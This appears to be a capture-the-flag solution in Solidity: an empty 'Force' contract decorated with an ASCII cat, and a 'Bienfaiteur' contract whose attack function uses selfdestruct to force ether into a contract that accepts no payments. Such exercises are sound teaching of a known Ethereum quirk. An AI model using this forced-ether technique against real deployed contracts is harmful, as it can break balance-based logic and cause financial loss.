// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

contract Bienfaiteur {
    function attack(address payable _victim) public payable{
        selfdestruct(_victim);
    }
}
